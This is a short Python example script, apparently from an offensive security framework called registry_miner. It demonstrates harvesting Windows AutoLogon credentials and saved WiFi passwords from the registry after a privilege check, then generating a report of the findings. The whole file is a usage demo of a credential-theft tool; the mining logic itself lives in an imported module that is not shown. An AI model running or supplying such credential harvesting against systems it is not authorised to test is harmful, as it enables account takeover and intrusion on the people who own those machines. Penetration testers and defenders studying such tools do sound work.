#!/usr/bin/env python3
"""
Example: Basic Registry Credential Mining
Demonstrates simple usage of the framework
"""

from registry_miner import RegistryCredentialMiner

def main():
    """Basic mining example"""
    print("[*] Example: Basic Registry Credential Mining")
    print("="*60)
    
    # Initialize framework
    miner = RegistryCredentialMiner(output_dir="example_output")
    
    # Check privileges
    is_admin, is_system = miner.check_privileges()
    
    # Mine AutoLogon credentials
    print("\n[*] Mining AutoLogon credentials...")
    autologon_creds = miner.mine_target('autologon')
    
    if autologon_creds:
        print(f"\n[+] Found {len(autologon_creds)} AutoLogon credential(s)")
    else:
        print(f"\n[-] No AutoLogon credentials found")
    
    # Mine WiFi passwords
    print("\n[*] Mining WiFi passwords...")
    wifi_creds = miner.mine_target('wifi')
    
    if wifi_creds:
        print(f"\n[+] Found {len(wifi_creds)} WiFi credential(s)")
    else:
        print(f"\n[-] No WiFi credentials found")
    
    # Update findings
    miner.findings['autologon'] = autologon_creds
    miner.findings['wifi'] = wifi_creds
    
    # Generate report
    miner.generate_report()
    
    return 0


if __name__ == '__main__':
    import sys
    sys.exit(main())
